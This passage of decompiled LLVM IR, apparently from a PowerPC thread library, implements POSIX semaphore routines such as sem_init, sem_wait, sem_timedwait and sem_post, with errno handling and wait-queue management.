  %v0_1001701c = call i32 @__errno_location()
  %v2_10017024 = inttoptr i32 %v0_1001701c to i32*
  store i32 38, i32* %v2_10017024, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v0_10017048 = call i32 @__errno_location()
  %v2_10017050 = inttoptr i32 %v0_10017048 to i32*
  store i32 38, i32* %v2_10017050, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v0_10017074 = call i32 @__errno_location()
  %v2_1001707c = inttoptr i32 %v0_10017074 to i32*
  store i32 38, i32* %v2_1001707c, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100170a0 = add i32 %arg1, 12
  %v2_100170a0 = inttoptr i32 %v1_100170a0 to i32*
  %v3_100170a0 = load i32, i32* %v2_100170a0, align 4
  %v3_100170a8 = icmp eq i32 %v3_100170a0, 0
  br i1 %v3_100170a8, label %dec_label_pc_100170c0, label %dec_label_pc_100170b0

dec_label_pc_100170b0:                            ; preds = %entry
  %v0_100170b0 = call i32 @__errno_location()
  %v2_100170b8 = inttoptr i32 %v0_100170b0 to i32*
  store i32 16, i32* %v2_100170b8, align 4
  br label %dec_label_pc_100170c0

dec_label_pc_100170c0:                            ; preds = %entry, %dec_label_pc_100170b0
  %v0_100170cc = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_100170b0 ]
  ret i32 %v0_100170cc

; uselistorder directives
  uselistorder label %dec_label_pc_100170c0, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268529900, i32* @lr, align 4
  %v0_100170e8 = call i32 @__pthread_lock()
  %v0_100170ec = load i32, i32* @r31, align 4
  %v1_100170ec = add i32 %v0_100170ec, 8
  %v2_100170ec = inttoptr i32 %v1_100170ec to i32*
  %v3_100170ec = load i32, i32* %v2_100170ec, align 4
  store i32 -1, i32* %r30.global-to-local, align 4
  %v3_100170f4 = icmp eq i32 %v3_100170ec, 0
  br i1 %v3_100170f4, label %dec_label_pc_10017100, label %dec_label_pc_10017110

dec_label_pc_10017100:                            ; preds = %entry
  %v0_10017100 = call i32 @__errno_location()
  %v2_10017108 = inttoptr i32 %v0_10017100 to i32*
  store i32 11, i32* %v2_10017108, align 4
  br label %dec_label_pc_10017118

dec_label_pc_10017110:                            ; preds = %entry
  %v1_100170f8 = add i32 %v3_100170ec, -1
  store i32 %v1_100170f8, i32* %v2_100170ec, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10017118

dec_label_pc_10017118:                            ; preds = %dec_label_pc_10017100, %dec_label_pc_10017110
  %v0_10017118 = load i32, i32* @r31, align 4
  store i32 %v0_10017118, i32* @r3, align 4
  store i32 268529952, i32* @lr, align 4
  %v0_1001711c = call i32 @__pthread_unlock()
  %v0_10017120 = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_10017120

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10017118, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp5 = icmp sgt i32 %arg3, -1
  br i1 %tmp5, label %dec_label_pc_10017160, label %dec_label_pc_10017150

dec_label_pc_10017150:                            ; preds = %entry
  %v0_10017150 = call i32 @__errno_location()
  br label %dec_label_pc_10017170

dec_label_pc_10017160:                            ; preds = %entry
  %v3_10017144 = icmp eq i32 %arg2, 0
  br i1 %v3_10017144, label %dec_label_pc_10017178, label %dec_label_pc_10017164

dec_label_pc_10017164:                            ; preds = %dec_label_pc_10017160
  %v0_10017164 = call i32 @__errno_location()
  br label %dec_label_pc_10017170

dec_label_pc_10017170:                            ; preds = %dec_label_pc_10017150, %dec_label_pc_10017164
  %storemerge1 = phi i32 [ %v0_10017150, %dec_label_pc_10017150 ], [ %v0_10017164, %dec_label_pc_10017164 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_10017150 ], [ 38, %dec_label_pc_10017164 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10017170 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_10017170, align 4
  br label %dec_label_pc_1001718c

dec_label_pc_10017178:                            ; preds = %dec_label_pc_10017160
  %v2_10017178 = add i32 %tmp, 12
  %v3_10017178 = inttoptr i32 %v2_10017178 to i32*
  store i32 0, i32* %v3_10017178, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10017180 = add i32 %tmp, 8
  %v3_10017180 = inttoptr i32 %v2_10017180 to i32*
  store i32 %arg3, i32* %v3_10017180, align 4
  store i32 0, i32* %arg1, align 4
  %v2_10017188 = add i32 %tmp, 4
  %v3_10017188 = inttoptr i32 %v2_10017188 to i32*
  store i32 0, i32* %v3_10017188, align 4
  br label %dec_label_pc_1001718c

dec_label_pc_1001718c:                            ; preds = %dec_label_pc_10017170, %dec_label_pc_10017178
  %v0_10017190 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10017190

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_1001718c, { 1, 0 }
  uselistorder label %dec_label_pc_10017170, { 1, 0 }
}

define i32 @suspend.8(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268530096, i32* @lr, align 4
  %v0_100171ac = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_100171ac
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100171cc = load i32, i32* @r2, align 4
  store i32 %v0_100171cc, i32* @r4, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  store i32 268530160, i32* @lr, align 4
  %v0_100171ec = call i32 @__pthread_lock()
  %v0_100171f0 = load i32, i32* @r31, align 4
  %v1_100171f0 = add i32 %v0_100171f0, 8
  %v2_100171f0 = inttoptr i32 %v1_100171f0 to i32*
  %v3_100171f0 = load i32, i32* %v2_100171f0, align 4
  %tmp12 = icmp slt i32 %v3_100171f0, 1
  br i1 %tmp12, label %dec_label_pc_10017210, label %dec_label_pc_100171fc

dec_label_pc_100171fc:                            ; preds = %entry
  %v1_100171fc = add i32 %v3_100171f0, -1
  store i32 %v0_100171f0, i32* @r3, align 4
  store i32 %v1_100171fc, i32* %v2_100171f0, align 4
  store i32 ptrtoint (i32* @global_var_1001720c.1095 to i32), i32* @lr, align 4
  %v0_10017208 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100172fc

dec_label_pc_10017210:                            ; preds = %entry
  %v2_10017218 = ptrtoint i32* %stack_var_-20 to i32
  %v3_1001721c = add i32 %v0_100171cc, 442
  %v4_1001721c = inttoptr i32 %v3_1001721c to i8*
  store i8 0, i8* %v4_1001721c, align 1
  store i32 268530216, i32* @lr, align 4
  %v2_10017224 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100171cc, i32 %v2_10017218)
  %v1_1001722c = add i32 %v0_100171cc, 66
  %v2_1001722c = inttoptr i32 %v1_1001722c to i8*
  %v3_1001722c = load i8, i8* %v2_1001722c, align 1
  %v3_10017230 = icmp eq i8 %v3_1001722c, 0
  br i1 %v3_10017230, label %dec_label_pc_1001724c, label %dec_label_pc_10017238

dec_label_pc_10017238:                            ; preds = %dec_label_pc_10017210
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_10017240 = add i32 %v0_100171cc, 64
  %v2_10017240 = inttoptr i32 %v1_10017240 to i8*
  %v3_10017240 = load i8, i8* %v2_10017240, align 1
  %v3_10017244 = icmp eq i8 %v3_10017240, 0
  br i1 %v3_10017244, label %dec_label_pc_1001725c, label %dec_label_pc_1001724c

dec_label_pc_1001724c:                            ; preds = %dec_label_pc_10017238, %dec_label_pc_10017210
  %v0_10017250 = load i32, i32* @r31, align 4
  %v1_10017250 = add i32 %v0_10017250, 12
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10017258 = call i32 @enqueue.5(i32 %v1_10017250, i32 %v0_100171cc)
  br label %dec_label_pc_1001725c

dec_label_pc_1001725c:                            ; preds = %dec_label_pc_10017238, %dec_label_pc_1001724c
  %v0_1001725c = load i32, i32* @r31, align 4
  store i32 %v0_1001725c, i32* @r3, align 4
  store i32 268530276, i32* @lr, align 4
  %v0_10017260 = call i32 @__pthread_unlock()
  %v0_10017264 = load i32, i32* %r30.global-to-local, align 4
  %v3_10017264 = icmp eq i32 %v0_10017264, 0
  store i32 %v0_100171cc, i32* @r3, align 4
  br i1 %v3_10017264, label %dec_label_pc_10017284.preheader, label %dec_label_pc_1001726c

dec_label_pc_10017284.preheader:                  ; preds = %dec_label_pc_1001725c
  store i32 268530316, i32* @lr, align 4
  %v1_100172881 = call i32 @suspend.8(i32 %v0_100171cc)
  %v3_100172902 = load i8, i8* %v4_1001721c, align 1
  %v3_100172945 = icmp eq i8 %v3_100172902, 0
  %v1_100172a0 = add i32 %v0_100171cc, 440
  %v2_100172a0 = inttoptr i32 %v1_100172a0 to i8*
  br i1 %v3_100172945, label %dec_label_pc_1001729c.lr.ph, label %dec_label_pc_100172bc

dec_label_pc_1001729c.lr.ph:                      ; preds = %dec_label_pc_10017284.preheader
  %v1_100172b0 = add i32 %v0_100171cc, 64
  %v2_100172b0 = inttoptr i32 %v1_100172b0 to i8*
  br label %dec_label_pc_1001729c

dec_label_pc_1001726c:                            ; preds = %dec_label_pc_1001725c
  store i32 268530296, i32* @lr, align 4
  %v2_10017274 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100171cc, i32 0)
  br label %dec_label_pc_100172f8

dec_label_pc_1001729c:                            ; preds = %dec_label_pc_1001729c.lr.ph, %dec_label_pc_10017284.backedge
  %v3_100172a0 = load i8, i8* %v2_100172a0, align 1
  %v3_100172a4 = icmp eq i8 %v3_100172a0, 0
  br i1 %v3_100172a4, label %dec_label_pc_10017284.backedge, label %dec_label_pc_100172ac

dec_label_pc_10017284.backedge:                   ; preds = %dec_label_pc_1001729c, %dec_label_pc_100172ac
  store i32 %v0_100171cc, i32* @r3, align 4
  store i32 268530316, i32* @lr, align 4
  %v1_10017288 = call i32 @suspend.8(i32 %v0_100171cc)
  %v3_10017290 = load i8, i8* %v4_1001721c, align 1
  %v3_10017294 = icmp eq i8 %v3_10017290, 0
  br i1 %v3_10017294, label %dec_label_pc_1001729c, label %dec_label_pc_100172bc

dec_label_pc_100172ac:                            ; preds = %dec_label_pc_1001729c
  %v3_100172b0 = load i8, i8* %v2_100172b0, align 1
  %v3_100172b4 = icmp eq i8 %v3_100172b0, 0
  br i1 %v3_100172b4, label %dec_label_pc_100172bc, label %dec_label_pc_10017284.backedge

dec_label_pc_100172bc:                            ; preds = %dec_label_pc_10017284.backedge, %dec_label_pc_100172ac, %dec_label_pc_10017284.preheader
  store i32 268530376, i32* @lr, align 4
  %v2_100172c4 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100171cc, i32 0)
  %v3_100172cc = load i8, i8* %v2_100172a0, align 1
  %v3_100172d0 = icmp eq i8 %v3_100172cc, 0
  br i1 %v3_100172d0, label %dec_label_pc_100172fc, label %dec_label_pc_100172d8

dec_label_pc_100172d8:                            ; preds = %dec_label_pc_100172bc
  %v1_100172dc = add i32 %v0_100171cc, 64
  %v2_100172dc = inttoptr i32 %v1_100172dc to i8*
  %v3_100172dc = load i8, i8* %v2_100172dc, align 1
  %v3_100172e0 = icmp eq i8 %v3_100172dc, 0
  br i1 %v3_100172e0, label %dec_label_pc_100172e8, label %dec_label_pc_100172fc

dec_label_pc_100172e8:                            ; preds = %dec_label_pc_100172d8
  store i8 0, i8* %v2_100172a0, align 1
  br label %dec_label_pc_100172f8

dec_label_pc_100172f8:                            ; preds = %dec_label_pc_1001726c, %dec_label_pc_100172e8
  %v0_100172f8 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100172fc

dec_label_pc_100172fc:                            ; preds = %dec_label_pc_100172d8, %dec_label_pc_100172bc, %dec_label_pc_100171fc, %dec_label_pc_100172f8
  ret i32 0

; uselistorder directives
  uselistorder i8* %v4_1001721c, { 1, 0, 2 }
  uselistorder i32 %v0_100171cc, { 4, 5, 9, 8, 3, 6, 7, 0, 1, 10, 2, 12, 11, 13, 14 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 268530316, { 1, 0 }
  uselistorder label %dec_label_pc_100172fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100172f8, { 1, 0 }
  uselistorder label %dec_label_pc_100172bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10017284.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1001729c, { 1, 0 }
  uselistorder label %dec_label_pc_1001725c, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1001731c = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1001731c, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 268530488, i32* @lr, align 4
  %v0_10017334 = call i32 @__pthread_lock()
  %v0_10017338 = load i32, i32* @r29, align 4
  %v1_1001733c = add i32 %arg1, 12
  store i32 %v1_1001733c, i32* @r3, align 4
  %v2_10017340 = call i32 @remove_from_queue.6(i32 %v1_1001733c, i32 %v0_10017338)
  %v0_10017348 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10017348, i32* @r3, align 4
  store i32 268530512, i32* @lr, align 4
  %v0_1001734c = call i32 @__pthread_unlock()
  ret i32 %v2_10017340
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v0_1001737c = load i32, i32* @r2, align 4
  store i32 %v0_1001737c, i32* @r4, align 4
  store i32 268530572, i32* @lr, align 4
  %v0_10017388 = call i32 @__pthread_lock()
  %v0_1001738c = load i32, i32* @r30, align 4
  %v1_1001738c = add i32 %v0_1001738c, 8
  %v2_1001738c = inttoptr i32 %v1_1001738c to i32*
  %v3_1001738c = load i32, i32* %v2_1001738c, align 4
  store i32 %v3_1001738c, i32* %r9.global-to-local, align 4
  %tmp10 = icmp slt i32 %v3_1001738c, 1
  br i1 %tmp10, label %dec_label_pc_100173ac, label %dec_label_pc_10017398

dec_label_pc_10017398:                            ; preds = %entry
  %v1_10017398 = add i32 %v3_1001738c, -1
  store i32 %v0_1001738c, i32* @r3, align 4
  store i32 %v1_10017398, i32* %v2_1001738c, align 4
  store i32 ptrtoint (i32* @global_var_100173a8.1096 to i32), i32* @lr, align 4
  %v0_100173a4 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10017510

dec_label_pc_100173ac:                            ; preds = %entry
  %v0_100173b0 = load i32, i32* @r28, align 4
  %v1_100173b0 = add i32 %v0_100173b0, 4
  %v2_100173b0 = inttoptr i32 %v1_100173b0 to i32*
  %v3_100173b0 = load i32, i32* %v2_100173b0, align 4
  store i32 %v3_100173b0, i32* %r9.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_100173b0, 1000000000
  br i1 %tmp11, label %dec_label_pc_100173d8, label %dec_label_pc_100173c0

dec_label_pc_100173c0:                            ; preds = %dec_label_pc_100173ac
  store i32 %v0_1001738c, i32* @r3, align 4
  store i32 268530632, i32* @lr, align 4
  %v0_100173c4 = call i32 @__pthread_unlock()
  %v0_100173c8 = call i32 @__errno_location()
  br label %dec_label_pc_10017508

dec_label_pc_100173d8:                            ; preds = %dec_label_pc_100173ac
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 29460), i32* %r9.global-to-local, align 4
  store i32 %v0_1001738c, i32* %stack_var_-40, align 4
  %v0_100173ec = load i32, i32* @r31, align 4
  %v3_100173f0 = add i32 %v0_100173ec, 442
  %v4_100173f0 = inttoptr i32 %v3_100173f0 to i8*
  store i8 0, i8* %v4_100173f0, align 1
  %v2_100173f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268530684, i32* @lr, align 4
  %v2_100173f8 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100173ec, i32 %v2_100173f4)
  %v0_100173fc = load i32, i32* @r31, align 4
  %v1_100173fc = add i32 %v0_100173fc, 66
  %v2_100173fc = inttoptr i32 %v1_100173fc to i8*
  %v3_100173fc = load i8, i8* %v2_100173fc, align 1
  %v3_10017400 = icmp eq i8 %v3_100173fc, 0
  br i1 %v3_10017400, label %dec_label_pc_10017418, label %dec_label_pc_10017408

dec_label_pc_10017408:                            ; preds = %dec_label_pc_100173d8
  %v1_10017408 = add i32 %v0_100173fc, 64
  %v2_10017408 = inttoptr i32 %v1_10017408 to i8*
  %v3_10017408 = load i8, i8* %v2_10017408, align 1
  store i32 1, i32* @r29, align 4
  %v3_10017410 = icmp eq i8 %v3_10017408, 0
  br i1 %v3_10017410, label %dec_label_pc_10017428, label %dec_label_pc_10017418

dec_label_pc_10017418:                            ; preds = %dec_label_pc_10017408, %dec_label_pc_100173d8
  %v0_10017418 = load i32, i32* @r30, align 4
  %v1_10017418 = add i32 %v0_10017418, 12
  %v2_10017420 = call i32 @enqueue.5(i32 %v1_10017418, i32 %v0_100173fc)
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10017428

dec_label_pc_10017428:                            ; preds = %dec_label_pc_10017408, %dec_label_pc_10017418
  %v0_10017428 = load i32, i32* @r30, align 4
  store i32 %v0_10017428, i32* @r3, align 4
  store i32 268530736, i32* @lr, align 4
  %v0_1001742c = call i32 @__pthread_unlock()
  %v0_10017430 = load i32, i32* @r29, align 4
  %v3_10017430 = icmp eq i32 %v0_10017430, 0
  %v0_10017450.pre = load i32, i32* @r31, align 4
  br i1 %v3_10017430, label %dec_label_pc_10017450, label %dec_label_pc_10017438

dec_label_pc_10017438:                            ; preds = %dec_label_pc_10017428
  store i32 268530756, i32* @lr, align 4
  %v2_10017440 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10017450.pre, i32 0)
  br label %dec_label_pc_100174ec

dec_label_pc_10017450:                            ; preds = %dec_label_pc_100174b0, %dec_label_pc_100174a4, %dec_label_pc_10017428
  %v0_10017450 = phi i32 [ %v0_10017450.pre, %dec_label_pc_10017428 ], [ %v0_10017498, %dec_label_pc_100174a4 ], [ %v0_10017498, %dec_label_pc_100174b0 ]
  %v0_10017454 = load i32, i32* @r28, align 4
  store i32 268530780, i32* @lr, align 4
  %v2_10017458 = inttoptr i32 %v0_10017454 to i32*
  %v3_10017458 = call i32 @__pthread_timedsuspend_new(i32 %v0_10017450, i32* %v2_10017458)
  %v3_1001745c = icmp eq i32 %v3_10017458, 0
  br i1 %v3_1001745c, label %dec_label_pc_10017464, label %dec_label_pc_10017498

dec_label_pc_10017464:                            ; preds = %dec_label_pc_10017450
  %v0_10017464 = load i32, i32* @r30, align 4
  store i32 %v0_10017464, i32* @r3, align 4
  %v0_10017468 = load i32, i32* @r31, align 4
  store i32 %v0_10017468, i32* @r4, align 4
  store i32 268530800, i32* @lr, align 4
  %v0_1001746c = call i32 @__pthread_lock()
  %v0_10017470 = load i32, i32* @r31, align 4
  %v0_10017474 = load i32, i32* @r30, align 4
  %v1_10017474 = add i32 %v0_10017474, 12
  store i32 %v1_10017474, i32* @r3, align 4
  %v2_10017478 = call i32 @remove_from_queue.6(i32 %v1_10017474, i32 %v0_10017470)
  %v0_10017480 = load i32, i32* @r30, align 4
  store i32 %v0_10017480, i32* @r3, align 4
  store i32 268530824, i32* @lr, align 4
  %v0_10017484 = call i32 @__pthread_unlock()
  %v3_10017488 = icmp eq i32 %v2_10017478, 0
  br i1 %v3_10017488, label %dec_label_pc_10017490, label %dec_label_pc_100174f0

dec_label_pc_10017490:                            ; preds = %dec_label_pc_10017464
  %v0_10017490 = load i32, i32* @r31, align 4
  store i32 %v0_10017490, i32* @r3, align 4
  store i32 268530840, i32* @lr, align 4
  %v1_10017494 = call i32 @suspend.8(i32 %v0_10017490)
  br label %dec_label_pc_10017498

dec_label_pc_10017498:                            ; preds = %dec_label_pc_10017450, %dec_label_pc_10017490
  %v0_10017498 = load i32, i32* @r31, align 4
  %v1_10017498 = add i32 %v0_10017498, 442
  %v2_10017498 = inttoptr i32 %v1_10017498 to i8*
  %v3_10017498 = load i8, i8* %v2_10017498, align 1
  %v3_1001749c = icmp eq i8 %v3_10017498, 0
  br i1 %v3_1001749c, label %dec_label_pc_100174a4, label %dec_label_pc_100174bc

dec_label_pc_100174a4:                            ; preds = %dec_label_pc_10017498
  %v1_100174a4 = add i32 %v0_10017498, 440
  %v2_100174a4 = inttoptr i32 %v1_100174a4 to i8*
  %v3_100174a4 = load i8, i8* %v2_100174a4, align 1
  %v3_100174a8 = icmp eq i8 %v3_100174a4, 0
  br i1 %v3_100174a8, label %dec_label_pc_10017450, label %dec_label_pc_100174b0

dec_label_pc_100174b0:                            ; preds = %dec_label_pc_100174a4
  %v1_100174b0 = add i32 %v0_10017498, 64
  %v2_100174b0 = inttoptr i32 %v1_100174b0 to i8*
  %v3_100174b0 = load i8, i8* %v2_100174b0, align 1
  %v3_100174b4 = icmp eq i8 %v3_100174b0, 0
  br i1 %v3_100174b4, label %dec_label_pc_100174bc, label %dec_label_pc_10017450

dec_label_pc_100174bc:                            ; preds = %dec_label_pc_100174b0, %dec_label_pc_10017498
  store i32 268530888, i32* @lr, align 4
  %v2_100174c4 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10017498, i32 0)
  %v0_100174c8 = load i32, i32* @r31, align 4
  %v1_100174c8 = add i32 %v0_100174c8, 440
  %v2_100174c8 = inttoptr i32 %v1_100174c8 to i8*
  %v3_100174c8 = load i8, i8* %v2_100174c8, align 1
  %v3_100174cc = icmp eq i8 %v3_100174c8, 0
  br i1 %v3_100174cc, label %dec_label_pc_10017510, label %dec_label_pc_100174d4

dec_label_pc_100174d4:                            ; preds = %dec_label_pc_100174bc
  %v1_100174d4 = add i32 %v0_100174c8, 64
  %v2_100174d4 = inttoptr i32 %v1_100174d4 to i8*
  %v3_100174d4 = load i8, i8* %v2_100174d4, align 1
  %v3_100174d8 = icmp eq i8 %v3_100174d4, 0
  br i1 %v3_100174d8, label %dec_label_pc_100174e0, label %dec_label_pc_10017510

dec_label_pc_100174e0:                            ; preds = %dec_label_pc_100174d4
  store i8 0, i8* %v2_100174c8, align 1
  br label %dec_label_pc_100174ec

dec_label_pc_100174ec:                            ; preds = %dec_label_pc_10017438, %dec_label_pc_100174e0
  %v0_100174ec = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100174f0

dec_label_pc_100174f0:                            ; preds = %dec_label_pc_10017464, %dec_label_pc_100174ec
  %v0_100174f0 = load i32, i32* @r31, align 4
  store i32 268530940, i32* @lr, align 4
  %v2_100174f8 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100174f0, i32 0)
  %v0_100174fc = call i32 @__errno_location()
  br label %dec_label_pc_10017508

dec_label_pc_10017508:                            ; preds = %dec_label_pc_100173c0, %dec_label_pc_100174f0
  %storemerge2 = phi i32 [ %v0_100173c8, %dec_label_pc_100173c0 ], [ %v0_100174fc, %dec_label_pc_100174f0 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_100173c0 ], [ 110, %dec_label_pc_100174f0 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10017508 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_10017508, align 4
  %v0_10017518.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017514

dec_label_pc_10017510:                            ; preds = %dec_label_pc_100174d4, %dec_label_pc_100174bc, %dec_label_pc_10017398
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017514

dec_label_pc_10017514:                            ; preds = %dec_label_pc_10017508, %dec_label_pc_10017510
  %v0_10017518 = phi i32 [ %v0_10017518.pre, %dec_label_pc_10017508 ], [ 0, %dec_label_pc_10017510 ]
  ret i32 %v0_10017518

; uselistorder directives
  uselistorder i32 %v0_10017498, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 110, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_do_exit, { 9, 8, 11, 7, 1, 3, 6, 5, 0, 4, 2, 10 }
  uselistorder i32 440, { 0, 1, 2, 6, 5, 3, 4 }
  uselistorder i32 (i32)* @suspend.8, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @enqueue.5, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.7, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10017514, { 1, 0 }
  uselistorder label %dec_label_pc_10017508, { 1, 0 }
  uselistorder label %dec_label_pc_100174f0, { 1, 0 }
  uselistorder label %dec_label_pc_100174ec, { 1, 0 }
  uselistorder label %dec_label_pc_10017498, { 1, 0 }
  uselistorder label %dec_label_pc_10017428, { 1, 0 }
}

define i32 @__new_sem_post(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_10017534 = load i32, i32* @r2, align 4
  store i32 %v0_10017534, i32* @r4, align 4
  %v1_10017544 = add i32 %v0_10017534, 84
  %v2_10017544 = inttoptr i32 %v1_10017544 to i32*
  %v3_10017544 = load i32, i32* %v2_10017544, align 4
  store i32 %v3_10017544, i32* @r29, align 4
  %v3_10017548 = icmp eq i32 %v3_10017544, 0
  br i1 %v3_10017548, label %dec_label_pc_10017550, label %dec_label_pc_100175cc

dec_label_pc_10017550:                            ; preds = %entry
  store i32 268531028, i32* @lr, align 4
  %v0_10017550 = call i32 @__pthread_lock()
  %v0_10017554 = load i32, i32* @r30, align 4
  %v1_10017554 = add i32 %v0_10017554, 12
  %v2_10017554 = inttoptr i32 %v1_10017554 to i32*
  %v3_10017554 = load i32, i32* %v2_10017554, align 4
  store i32 %v3_10017554, i32* @r31, align 4
  %v3_10017558 = icmp eq i32 %v3_10017554, 0
  br i1 %v3_10017558, label %dec_label_pc_10017560, label %dec_label_pc_100175a0

dec_label_pc_10017560:                            ; preds = %dec_label_pc_10017550
  %v1_10017560 = add i32 %v0_10017554, 8
  %v2_10017560 = inttoptr i32 %v1_10017560 to i32*
  %v3_10017560 = load i32, i32* %v2_10017560, align 4
  store i32 %v3_10017560, i32* %r9.global-to-local, align 4
  %v3_10017568 = icmp eq i32 %v3_10017560, 2147483647
  br i1 %v3_10017568, label %dec_label_pc_10017570, label %dec_label_pc_1001758c

dec_label_pc_10017570:                            ; preds = %dec_label_pc_10017560
  %v0_10017570 = call i32 @__errno_location()
  %v2_10017578 = inttoptr i32 %v0_10017570 to i32*
  store i32 34, i32* %v2_10017578, align 4
  %v0_1001757c = load i32, i32* @r30, align 4
  store i32 %v0_1001757c, i32* @r3, align 4
  store i32 268531076, i32* @lr, align 4
  %v0_10017580 = call i32 @__pthread_unlock()
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017638

dec_label_pc_1001758c:                            ; preds = %dec_label_pc_10017560
  %v1_1001758c = add i32 %v3_10017560, 1
  store i32 %v0_10017554, i32* @r3, align 4
  store i32 %v1_1001758c, i32* %v2_10017560, align 4
  store i32 ptrtoint (i32* @global_var_1001759c.1098 to i32), i32* @lr, align 4
  %v0_10017598 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10017634

dec_label_pc_100175a0:                            ; preds = %dec_label_pc_10017550
  %v1_100175a0 = add i32 %v3_10017554, 8
  %v2_100175a0 = inttoptr i32 %v1_100175a0 to i32*
  %v3_100175a0 = load i32, i32* %v2_100175a0, align 4
  store i32 %v0_10017554, i32* @r3, align 4
  store i32 %v3_100175a0, i32* %v2_10017554, align 4
  %v0_100175ac = load i32, i32* @r29, align 4
  %v1_100175ac = load i32, i32* @r31, align 4
  %v2_100175ac = add i32 %v1_100175ac, 8
  %v3_100175ac = inttoptr i32 %v2_100175ac to i32*
  store i32 %v0_100175ac, i32* %v3_100175ac, align 4
  store i32 ptrtoint (i32* @global_var_100175b4.1099 to i32), i32* @lr, align 4
  %v0_100175b0 = call i32 @__pthread_unlock()
  %v2_100175b8 = load i32, i32* @r31, align 4
  %v3_100175b8 = add i32 %v2_100175b8, 442
  %v4_100175b8 = inttoptr i32 %v3_100175b8 to i8*
  store i8 1, i8* %v4_100175b8, align 1
  %v0_100175c0 = load i32, i32* @r31, align 4
  store i32 %v0_100175c0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100175c8.1100 to i32), i32* @lr, align 4
  %v0_100175c4 = call i32 @__pthread_restart_new()
  br label %dec_label_pc_10017634

dec_label_pc_100175cc:                            ; preds = %entry
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100175d0 = load i32, i32* @global_var_100450e4.985, align 4
  %tmp7 = icmp sgt i32 %v3_100175d0, -1
  br i1 %tmp7, label %dec_label_pc_100175fc, label %dec_label_pc_100175dc

